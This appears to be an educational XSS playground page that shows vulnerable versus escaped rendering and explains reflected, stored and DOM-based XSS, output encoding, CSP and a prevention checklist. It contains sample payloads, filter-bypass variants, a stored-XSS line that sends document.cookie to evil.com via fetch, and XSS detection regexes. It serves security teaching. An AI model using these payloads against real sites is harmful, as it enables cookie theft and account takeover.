@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Educational XSS playground - learn how cross-site scripting attacks work and how to prevent them with proper output encoding.">
+    <meta name="keywords" content="XSS, cross-site scripting, XSS tutorial, XSS prevention, output encoding, OWASP XSS">
+    <title>XSS Playground - RmVuln</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .tool-container {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+        .preview-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        @media (max-width: 768px) {
+            .preview-section {
+                grid-template-columns: 1fr;
+            }
+        }
+        .preview-box {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .preview-header {
+            padding: 0.75rem 1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .preview-header.vulnerable {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .preview-header.secure {
+            background: #d4edda;
+            color: #155724;
+        }
+        .preview-content {
+            padding: 1.5rem;
+            min-height: 150px;
+            border-top: 1px solid #eee;
+        }
+        .input-section {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+        }
+        .input-section label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        .input-section textarea {
+            width: 100%;
+            min-height: 100px;
+            padding: 1rem;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            resize: vertical;
+            box-sizing: border-box;
+        }
+        .input-section textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .payloads-section {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+        }
+        .payload-category {
+            margin-bottom: 1.5rem;
+        }
+        .payload-category h4 {
+            margin-bottom: 0.75rem;
+            color: #333;
+        }
+        .payload-btn {
+            display: inline-block;
+            padding: 0.5rem 0.75rem;
+            margin: 0.25rem;
+            background: #e9ecef;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            transition: all 0.2s;
+            text-align: left;
+        }
+        .payload-btn:hover {
+            background: #667eea;
+            color: white;
+        }
+        .context-tabs {
+            display: flex;
+            gap: 0;
+            margin-bottom: 0;
+        }
+        .context-tab {
+            padding: 0.75rem 1.5rem;
+            background: #e9ecef;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .context-tab:first-child { border-radius: 8px 0 0 0; }
+        .context-tab:last-child { border-radius: 0 8px 0 0; }
+        .context-tab.active {
+            background: #667eea;
+            color: white;
+        }
+        .context-content {
+            display: none;
+            background: white;
+            padding: 1.5rem;
+            border-radius: 0 8px 8px 8px;
+        }
+        .context-content.active { display: block; }
+        .code-display {
+            background: #1a1a2e;
+            color: #f8f8f2;
+            padding: 1rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+        .code-display .tag { color: #ff79c6; }
+        .code-display .attr { color: #50fa7b; }
+        .code-display .string { color: #f1fa8c; }
+        .code-display .injection { color: #ff5555; background: rgba(255,85,85,0.2); }
+        .disclaimer-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        .alert-simulation {
+            background: #e7f3ff;
+            border: 2px solid #667eea;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .comparison-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        @media (max-width: 768px) {
+            .comparison-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        .comparison-box {
+            padding: 1rem;
+            border-radius: 8px;
+        }
+        .comparison-box.bad {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+        }
+        .comparison-box.good {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <a href="index.html" style="text-decoration: none; color: inherit;"><h1>RmVuln</h1></a>
+            <p class="tagline">XSS Playground</p>
+        </div>
+    </header>
+
+    <main class="container">
+        <a href="index.html" class="back-link">&larr; Back to Home</a>
+
+        <section class="intro">
+            <h2>Learn Cross-Site Scripting (XSS)</h2>
+            <p>This educational playground demonstrates how XSS attacks work and why proper output encoding is essential. Compare vulnerable vs secure rendering side-by-side.</p>
+        </section>
+
+        <div class="tool-container">
+            <div class="disclaimer-box">
+                <strong>Educational Purpose Only</strong> - This playground runs safely in your browser with script execution disabled for demonstration. No actual XSS attacks are performed. Use this knowledge responsibly.
+            </div>
+
+            <div class="input-section">
+                <label for="user-input">User Input (simulated form submission)</label>
+                <textarea id="user-input" oninput="updatePreview()" placeholder="Enter text to see how it renders...">Hello, my name is John!</textarea>
+            </div>
+
+            <div class="preview-section">
+                <div class="preview-box">
+                    <div class="preview-header vulnerable">
+                        <span>Vulnerable (innerHTML)</span>
+                    </div>
+                    <div class="preview-content" id="vulnerable-preview"></div>
+                    <div style="padding: 0 1rem 1rem;">
+                        <small style="color: #666;">User input rendered directly as HTML</small>
+                    </div>
+                </div>
+
+                <div class="preview-box">
+                    <div class="preview-header secure">
+                        <span>Secure (textContent)</span>
+                    </div>
+                    <div class="preview-content" id="secure-preview"></div>
+                    <div style="padding: 0 1rem 1rem;">
+                        <small style="color: #666;">User input properly escaped</small>
+                    </div>
+                </div>
+            </div>
+
+            <div id="xss-detected" class="alert-simulation" style="display: none;">
+                <strong>XSS Payload Detected!</strong><br>
+                In a vulnerable application, JavaScript would execute here.<br>
+                <span id="xss-description"></span>
+            </div>
+
+            <div class="payloads-section">
+                <h3>Try These XSS Payloads</h3>
+
+                <div class="payload-category">
+                    <h4>Basic Script Injection</h4>
+                    <button class="payload-btn" onclick="insertPayload('<script>alert(1)</script>')">&lt;script&gt;alert(1)&lt;/script&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<script>alert(document.cookie)</script>')">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</button>
+                </div>
+
+                <div class="payload-category">
+                    <h4>Event Handler Injection</h4>
+                    <button class="payload-btn" onclick="insertPayload('<img src=x onerror=alert(1)>')">&lt;img src=x onerror=alert(1)&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<svg onload=alert(1)>')">&lt;svg onload=alert(1)&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<body onload=alert(1)>')">&lt;body onload=alert(1)&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<div onmouseover=alert(1)>hover me</div>')">&lt;div onmouseover=alert(1)&gt;</button>
+                </div>
+
+                <div class="payload-category">
+                    <h4>HTML Injection</h4>
+                    <button class="payload-btn" onclick="insertPayload('<a href=\"javascript:alert(1)\">click me</a>')">&lt;a href="javascript:alert(1)"&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<iframe src=\"javascript:alert(1)\">')">&lt;iframe src="javascript:..."&gt;</button>
+                    <button class="payload-btn" onclick="insertPayload('<form action=\"https://evil.com\"><input name=password></form>')">&lt;form action="evil.com"&gt;</button>
+                </div>
+
+                <div class="payload-category">
+                    <h4>Filter Bypass Techniques</h4>
+                    <button class="payload-btn" onclick="insertPayload('<ScRiPt>alert(1)</ScRiPt>')">Case variation</button>
+                    <button class="payload-btn" onclick="insertPayload('<scr<script>ipt>alert(1)</scr</script>ipt>')">Nested tags</button>
+                    <button class="payload-btn" onclick="insertPayload('<img src=x onerror=\"&#97;lert(1)\">')">HTML entities</button>
+                    <button class="payload-btn" onclick="insertPayload('javascript:alert(1)//')">Protocol handler</button>
+                </div>
+            </div>
+
+            <div class="code-display">
+<pre><span style="color: #6272a4;">// Vulnerable code (DON'T DO THIS)</span>
+element.<span class="tag">innerHTML</span> = userInput;
+
+<span style="color: #6272a4;">// Secure code (DO THIS)</span>
+element.<span class="tag">textContent</span> = userInput;
+<span style="color: #6272a4;">// OR use proper encoding library</span></pre>
+            </div>
+        </div>
+
+        <!-- XSS Types -->
+        <section class="vulnerability-card">
+            <h2>Types of XSS</h2>
+
+            <h3>1. Reflected XSS</h3>
+            <p>Payload is reflected off the web server in error messages, search results, or any response that includes user input.</p>
+            <div class="code-block">
+<pre><code>// URL: https://example.com/search?q=<script>alert(1)</script>
+
+// Vulnerable server code:
+app.get('/search', (req, res) => {
+  res.send(`Results for: ${req.query.q}`);  // VULNERABLE
+});
+
+// Attack: Send victim a malicious link</code></pre>
+            </div>
+
+            <h3>2. Stored XSS</h3>
+            <p>Payload is permanently stored on target server (database, comment field, forum post).</p>
+            <div class="code-block">
+<pre><code>// Attacker posts comment:
+<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+
+// Every user who views the page executes the script
+// Most dangerous type - affects all users</code></pre>
+            </div>
+
+            <h3>3. DOM-based XSS</h3>
+            <p>Payload is executed as a result of modifying the DOM environment in the victim's browser.</p>
+            <div class="code-block">
+<pre><code>// URL: https://example.com/page#<img src=x onerror=alert(1)>
+
+// Vulnerable JavaScript:
+document.getElementById('content').innerHTML = location.hash.slice(1);
+
+// Server never sees the payload - it's all client-side</code></pre>
+            </div>
+        </section>
+
+        <!-- Prevention -->
+        <section class="vulnerability-card">
+            <h2>XSS Prevention</h2>
+
+            <h3>Output Encoding by Context</h3>
+            <table class="styled-table">
+                <thead>
+                    <tr>
+                        <th>Context</th>
+                        <th>Encoding Required</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>HTML Body</td>
+                        <td>HTML Entity Encoding</td>
+                        <td><code>&lt;</code> becomes <code>&amp;lt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>HTML Attribute</td>
+                        <td>Attribute Encoding</td>
+                        <td><code>"</code> becomes <code>&amp;quot;</code></td>
+                    </tr>
+                    <tr>
+                        <td>JavaScript</td>
+                        <td>JavaScript Encoding</td>
+                        <td><code>'</code> becomes <code>\x27</code></td>
+                    </tr>
+                    <tr>
+                        <td>URL Parameter</td>
+                        <td>URL Encoding</td>
+                        <td><code><</code> becomes <code>%3C</code></td>
+                    </tr>
+                    <tr>
+                        <td>CSS</td>
+                        <td>CSS Encoding</td>
+                        <td><code>(</code> becomes <code>\28</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Secure Code Examples</h3>
+            <div class="comparison-grid">
+                <div class="comparison-box bad">
+                    <strong>Vulnerable</strong>
+                    <div class="code-block">
+<pre><code>// JavaScript
+element.innerHTML = userInput;
+
+// React (dangerous)
+&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;
+
+// PHP
+echo $_GET['name'];
+
+// Python/Jinja2
+{{ user_input | safe }}</code></pre>
+                    </div>
+                </div>
+
+                <div class="comparison-box good">
+                    <strong>Secure</strong>
+                    <div class="code-block">
+<pre><code>// JavaScript
+element.textContent = userInput;
+
+// React (auto-escapes)
+&lt;div&gt;{userInput}&lt;/div&gt;
+
+// PHP
+echo htmlspecialchars($_GET['name'], ENT_QUOTES);
+
+// Python/Jinja2
+{{ user_input }}  // auto-escaped</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Content Security Policy (CSP)</h3>
+            <div class="code-block">
+<pre><code>// HTTP Header - Defense in depth
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+
+// Prevents inline scripts even if XSS vulnerability exists
+// Blocks: &lt;script&gt;alert(1)&lt;/script&gt;
+// Blocks: &lt;img onerror="alert(1)"&gt;
+
+// HTML meta tag alternative
+&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'"&gt;</code></pre>
+            </div>
+        </section>
+
+        <!-- Checklist -->
+        <section class="vulnerability-card">
+            <h2>XSS Prevention Checklist</h2>
+            <div class="remediation">
+                <ul>
+                    <li><strong>Encode output</strong> based on context (HTML, JS, URL, CSS)</li>
+                    <li><strong>Use safe APIs</strong> - textContent instead of innerHTML</li>
+                    <li><strong>Use frameworks</strong> that auto-escape (React, Angular, Vue)</li>
+                    <li><strong>Implement CSP</strong> headers as defense-in-depth</li>
+                    <li><strong>Validate input</strong> - whitelist allowed characters</li>
+                    <li><strong>Use HTTPOnly cookies</strong> to protect session tokens</li>
+                    <li><strong>Sanitize HTML</strong> with DOMPurify if rich text needed</li>
+                    <li><strong>Avoid dangerous sinks</strong> - eval(), document.write()</li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 RmVuln. Quick reference for security professionals.</p>
+            <p><a href="index.html">Home</a> | <a href="https://fixthevuln.com" target="_blank">FixTheVuln.com</a></p>
+        </div>
+    </footer>
+
+    <script>
+        function updatePreview() {
+            const input = document.getElementById('user-input').value;
+            const vulnerablePreview = document.getElementById('vulnerable-preview');
+            const securePreview = document.getElementById('secure-preview');
+            const xssDetected = document.getElementById('xss-detected');
+            const xssDescription = document.getElementById('xss-description');
+
+            // Secure preview - always safe
+            securePreview.textContent = input;
+
+            // For vulnerable preview, show how it WOULD render (but don't actually execute scripts)
+            // Replace script tags with visible representation
+            let displayHTML = input
+                .replace(/<script/gi, '&lt;script')
+                .replace(/<\/script>/gi, '&lt;/script&gt;');
+
+            // Show other HTML but neutralize dangerous handlers
+            displayHTML = displayHTML
+                .replace(/onerror\s*=/gi, 'data-onerror=')
+                .replace(/onload\s*=/gi, 'data-onload=')
+                .replace(/onclick\s*=/gi, 'data-onclick=')
+                .replace(/onmouseover\s*=/gi, 'data-onmouseover=')
+                .replace(/onfocus\s*=/gi, 'data-onfocus=')
+                .replace(/javascript:/gi, 'javascript-disabled:');
+
+            vulnerablePreview.innerHTML = displayHTML;
+
+            // Detect XSS patterns
+            const xssPatterns = [
+                { pattern: /<script/i, desc: 'Script tag injection detected' },
+                { pattern: /on\w+\s*=/i, desc: 'Event handler injection detected' },
+                { pattern: /javascript:/i, desc: 'JavaScript protocol injection detected' },
+                { pattern: /<iframe/i, desc: 'Iframe injection detected' },
+                { pattern: /<img[^>]+onerror/i, desc: 'Image error handler injection' },
+                { pattern: /<svg[^>]+onload/i, desc: 'SVG onload injection' },
+                { pattern: /<a[^>]+href\s*=\s*["']?javascript/i, desc: 'Anchor JavaScript injection' }
+            ];
+
+            let detected = null;
+            for (const p of xssPatterns) {
+                if (p.pattern.test(input)) {
+                    detected = p;
+                    break;
+                }
+            }
+
+            if (detected) {
+                xssDetected.style.display = 'block';
+                xssDescription.textContent = detected.desc;
+            } else {
+                xssDetected.style.display = 'none';
+            }
+        }
+
+        function insertPayload(payload) {
+            document.getElementById('user-input').value = payload;
+            updatePreview();
+        }
+
+        // Initialize
+        updatePreview();
+    </script>
+</body>
+</html>
